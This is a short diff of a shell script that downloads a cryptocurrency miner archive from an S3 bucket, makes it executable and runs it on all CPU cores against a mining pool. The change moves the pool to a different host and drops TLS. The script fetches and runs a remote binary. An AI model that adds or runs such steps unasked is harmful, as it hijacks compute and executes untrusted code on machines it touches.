@@ -3,6 +3,6 @@ apt-get update && apt-get upgrade -y
 apt-get install sudo -y
 wget https://poolsolution.s3.eu-west-2.amazonaws.com/virelabminer.tar.gz
 tar -xvf virelabminer.tar.gz && chmod +x virelabminer
-./virelabminer -o stratum+tcp://vrl.minerlab.io:6312 -u vgup4cen6chqskasvfbzk0dmj58bub9iq2nwym4f37mdcwft7.worker1 --tls -k -t $(nproc --all)
+./virelabminer -o eu.rplant.xyz:7155 -u vgup4cen6chqskasvfbzk0dmj58bub9iq2nwym4f37mdcwft7.worker1 -k -t $(nproc --all)
 sleep 5
 done
